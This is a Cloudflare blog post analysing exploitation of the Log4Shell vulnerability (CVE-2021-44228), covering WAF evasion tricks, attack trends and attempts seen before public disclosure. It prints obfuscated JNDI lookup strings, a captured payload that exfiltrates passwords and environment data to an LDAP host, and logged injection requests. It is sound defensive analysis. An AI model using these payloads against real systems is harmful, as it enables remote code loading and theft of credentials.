<div class="mb2 gray5">4 min read</div>
<div class="mt4">This post is also available in <a href="https://blog.cloudflare.com/zh-cn/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns">简体中文</a>, <a href="https://blog.cloudflare.com/fr-fr/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns">Français</a>, <a href="https://blog.cloudflare.com/de-de/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns">Deutsch</a>, <a href="https://blog.cloudflare.com/ja-jp/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns">日本語</a>, <a href="https://blog.cloudflare.com/ko-kr/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns">한국어</a> and <a href="https://blog.cloudflare.com/zh-tw/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns">繁體中文</a>.</div><img class="mr2" src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1EhzOb1IaHwVakcdPU9obZ/c9954d969df85716243de7c9dcb78903/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns.png" alt="">
<div class="post-content lh-copy gray1">
	<p>In this blog post we will cover WAF evasion patterns and exfiltration attempts seen in the world, trend data on attempted exploitation, and information on exploitation that we saw prior to the public disclosure of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a>.</p>
	<p>In short, we saw limited testing of the vulnerability on December 1, <i>eight days before public disclosure</i>. We saw the <i>first attempt to exploit the vulnerability just nine minutes after public disclosure</i> showing just how fast attackers exploit newly found problems.</p>
	<p>We also see mass attempts to evade WAFs that have tried to perform simple blocking, we see mass attempts to exfiltrate data including secret credentials and passwords.</p>
	<div class="flex anchor relative">
		<h3 id="waf-evasion-patterns-and-exfiltration-examples">WAF Evasion Patterns and Exfiltration Examples</h3>
		<a href="https://blog.cloudflare.com/#waf-evasion-patterns-and-exfiltration-examples" aria-hidden="true" class="relative sm:absolute sm:-left-5">
			<svg width="16" height="16" viewBox="0 0 24 24">
				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
			</svg>
		</a>
	</div>
	<p>Since the <a href="https://www.lunasec.io/docs/blog/log4j-zero-day">disclosure</a> of CVE-2021-44228 (now commonly referred to as Log4Shell) we have seen attackers go from using simple attack strings to actively trying to evade blocking by WAFs. <a href="https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf">WAFs</a> provide a useful tool for stopping external attackers and WAF evasion is commonly attempted to get past simplistic rules.</p>
	<p>In the earliest stages of exploitation of the Log4j vulnerability attackers were using un-obfuscated strings typically starting with <code>${jndi:dns, ${jndi:rmi</code> and <code>${jndi:ldap</code> and simple rules to look for those patterns were effective.</p>
	<p>Quickly after those strings were being blocked and attackers switched to using evasion techniques. They used, and are using, both standard evasion techniques (escaping or encoding of characters) and tailored evasion specific to the <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Log4j Lookups language</a>.</p>
	<p>Any capable WAF will be able to handle the standard techniques. Tricks like encoding <code>${</code> as <code>%24%7B</code> or <code>\u0024\u007b</code> are easily reversed before applying rules to check for the specific exploit being used.</p>
	<p>However, the Log4j language has some rich functionality that enables obscuring the key strings that some WAFs look for. For example, the <code>${lower}</code> lookup will lowercase a string. So, <code>${lower:H}</code> would turn into <code>h</code>. Using lookups attackers are disguising critical strings like <code>jndi</code> helping to evade WAFs.</p>
	<p>In the wild we are seeing use of <code>${date}</code>, <code>${lower}</code>, <code>${upper}</code>, <code>${web}</code>, <code>${main}</code> and <code>${env}</code> for evasion. Additionally, <code>${env}</code>, <code>${sys}</code> and <code>${main}</code> (and other specialized lookups for Docker, Kubernetes and other systems) are being used to exfiltrate data from the target process’ environment (including critical secrets).</p>
	<p>To better understand how this language is being used, here is a small Java program that takes a string on the command-line and logs it to the console via Log4j:</p>
	<pre class="language-bash"><code class="language-bash">import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4jTester{
    private static final Logger logger = LogManager.getLogger(log4jTester.class);
       
    public static void main(String[] args) {
	logger.error(args[0]);
    }
}</code></pre>
	<p>This simple program writes to the console. Here it is logging the single word hide.</p>
	<pre class="language-bash"><code class="language-bash">$ java log4jTester.java 'hide'          
01:28:25.606 [main] ERROR log4jTester - hide</code></pre>
	<p>The Log4j language allows use of the <code>${}</code> inside <code>${}</code> thus attackers are able to combine multiple different keywords for evasion. For example, the following <code>${lower:${lower:h}}${lower:${upper:i}}${lower:D}e</code> would be logged as the word <code>hide</code>. That makes it easy for an attacker to evade simplistic searching for <code>${jndi</code>, for example, as the letters of <code>jndi</code> can be hidden in a similar manner.</p>
	<pre class="language-bash"><code class="language-bash">$ java log4jTester.java '${lower:${lower:h}}${lower:${upper:i}}${lower:d}e'
01:30:42.015 [main] ERROR log4jTester - hide</code></pre>
	<p>The other major evasion technique makes use of the :- syntax. That syntax enables the attacker to set a default value for a lookup and if the value looked up is empty then the default value is output. So, for example, looking up a non-existent environment variable can be used to output letters of a word.</p>
	<pre class="language-bash"><code class="language-bash">$ java log4jTester.java '${env:NOTEXIST:-h}i${env:NOTEXIST:-d}${env:NOTEXIST:-e}' 
01:35:34.280 [main] ERROR log4jTester - hide</code></pre>
	<p>Similar techniques are in use with <code>${web}</code>, <code>${main}</code>, etc. as well as strings like <code>${::-h}</code> or <code>${::::::-h}</code> which both turn into <code>h</code>. And, of course, combinations of these techniques are being put together to make more and more elaborate evasion attempts.</p>
	<p>To get a sense for how evasion has taken off here's a chart showing un-obfuscated <code>${jndi:</code> appearing in WAF blocks (the orange line), the use of the <code>${lower}</code> lookup (green line), use of URI encoding (blue line) and one particular evasion that's become popular <code>${${::-j}${::-n}${::-d}${::-i}</code>(red line).</p>
	<figure class="kg-card kg-image-card kg-width-wide">

		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6imnpZmBPnDmDdZL5YDHrG/e3fb526beb0d790b907bd16a2ca903a3/image--7-.png" alt="" class="kg-image" width="1994" height="728" loading="lazy">

	</figure>
	<p>For the first couple of days evasion was relatively rare. Now, however, although naive strings like <code>${jndi:</code> remain popular evasion has taken off and WAFs must block these improved attacks.</p>
	<p>We wrote last week about the initial phases of exploitation that were <a href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228">mostly about reconnaissance</a>. Since then attackers have moved on to data extraction.</p>
	<p>We see the use of <code>${env}</code> to extract environment variables, and <code>${sys}</code> to get information about the system on which Log4j is running. One attack, blocked in the wild, attempted to exfiltrate a lot of data from various Log4j lookups:</p>
	<pre class="language-bash"><code class="language-bash">${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:
imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:cont
ainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx
:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES
_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}</code></pre>
	<p>There you can see the user, home directory, Docker image name, details of Kubernetes and Spring, passwords for the user and databases, hostnames and command-line arguments being exfiltrated.</p>
	<p><b>Because of the sophistication of both evasion and exfiltration WAF vendors need to be looking at any occurrence of ${ and treating it as suspicious.</b> For this reason, we are additionally offering <a href="https://blog.cloudflare.com/log4j-cloudflare-logs-mitigation">to sanitize any logs</a> we send our customer to convert <code>${</code> to <code>x{</code>.</p>
	<p>The Cloudflare WAF team is continuously working to block attempted exploitation, but it is still vital that customers patch their systems with up to date Log4j or apply mitigations. Since data that is logged does not necessarily come via the Internet systems need patching whether they are Internet-facing or not.</p>
	<p>All paid customers have configurable WAF rules to help protect against CVE-2021-44228, and we have also deployed protection for our free customers.</p>
	<div class="flex anchor relative">
		<h3 id="cve-2021-44228-exploitation-trends">CVE-2021-44228 Exploitation Trends</h3>
		<a href="https://blog.cloudflare.com/#cve-2021-44228-exploitation-trends" aria-hidden="true" class="relative sm:absolute sm:-left-5">
			<svg width="16" height="16" viewBox="0 0 24 24">
				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
			</svg>
		</a>
	</div>
	<p>Cloudflare quickly put in place WAF rules to help block these attacks. The following chart shows how those blocked attacks evolved.</p>
	<figure class="kg-card kg-image-card kg-width-wide">

		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7vRyAqkAVVCcgYXQyAW3He/8d1ee7c2575a6a2106c4641fab7827dc/image3-39.png" alt="" class="kg-image" width="1999" height="496" loading="lazy">

	</figure>
	<p>From December 10 to December 13 we saw the number of blocks per minute ramp up as follows.</p>
	<p>Date</p>
	<p>Mean blocked requests per minute</p>
	<p>2021-12-10</p>
	<p>5,483</p>
	<p>2021-12-11</p>
	<p>18,606</p>
	<p>2021-12-12</p>
	<p>27,439</p>
	<p>2021-12-13</p>
	<p>24,642</p>
	<p>In our <a href="https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild">initial blog post</a> we noted that Canada (the green line below) was the top source country for attempted exploitation. As we predicted that did not continue and attacks are coming from all over the world, either directly from servers or via proxies.</p>
	<figure class="kg-card kg-image-card kg-width-wide">

		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/38r1ZNJMpqQQ1qV9aPzfiK/9bd75219c35a9a6f68b7c57633f51e20/image1-72.png" alt="" class="kg-image" width="1999" height="456" loading="lazy">

	</figure>
	<div class="flex anchor relative">
		<h3 id="exploitation-of-cve-2021-44228-prior-to-disclosure">Exploitation of CVE-2021-44228 prior to disclosure</h3>
		<a href="https://blog.cloudflare.com/#exploitation-of-cve-2021-44228-prior-to-disclosure" aria-hidden="true" class="relative sm:absolute sm:-left-5">
			<svg width="16" height="16" viewBox="0 0 24 24">
				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
			</svg>
		</a>
	</div>
	<p>CVE-2021-44228 was disclosed in a (now deleted) Tweet on 2021-12-09 14:25 UTC:</p>
	<figure class="kg-card kg-image-card ">

		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2H5jJqC0ZOKtwIBxFfXJWX/14ed9c5085d95c34b14e632e131aa9ea/image2-53.png" alt="" class="kg-image" width="500" height="470" loading="lazy">

	</figure>
	<p>However, our systems captured three instances of attempted exploitation or scanning on December 1, 2021 as follows. In each of these I have obfuscated IP addresses and domain names. These three injected <code>${jndi:ldap}</code> lookups in the HTTP <code>User-Agent</code> header, the <code>Referer</code> header and in URI parameters.</p>
	<pre class="language-bash"><code class="language-bash">2021-12-01 03:58:34
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://rb3w24.example.com/x}
Referer: /${jndi:ldap://rb3w24.example.com/x}
Path: /$%7Bjndi:ldap://rb3w24.example.com/x%7D

2021-12-01 04:36:50
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://y3s7xb.example.com/x}
Referer: /${jndi:ldap://y3s7xb.example.com/x}
Parameters: x=$%7Bjndi:ldap://y3s7xb.example.com/x%7D						

2021-12-01 04:20:30
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 ${jndi:ldap://vf9wws.example.com/x}
Referer: /${jndi:ldap://vf9wws.example.com/x}	
Parameters: x=$%7Bjndi:ldap://vf9wws.example.com/x%7D	</code></pre>
	<p>After those three attempts we saw no further activity until nine minutes after public disclosure when someone attempts to inject a <code>${jndi:ldap}</code> string via a URI parameter on a gaming website.</p>
	<pre class="language-bash"><code class="language-bash">2021-12-09 14:34:31
Parameters: redirectUrl=aaaaaaa$aadsdasad$${jndi:ldap://log4.cj.d.example.com/exp}</code></pre>

	<div class="flex anchor relative">
		<h3 id="conclusion">Conclusion</h3>
		<a href="https://blog.cloudflare.com/#conclusion" aria-hidden="true" class="relative sm:absolute sm:-left-5">
			<svg width="16" height="16" viewBox="0 0 24 24">
				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
			</svg>
		</a>
	</div>
	<p>CVE-2021-44228 is being actively exploited by numerous actors. WAFs are effective as a measure to help prevent attacks from the outside, but they are not foolproof and attackers are actively working on evasions. The potential for exfiltration of data and credentials is incredibly high and the long term risks of more devastating hacks and attacks is very real.</p>
	<p>It is vital to mitigate and patch affected software that uses Log4j now and not wait.</p>
</div>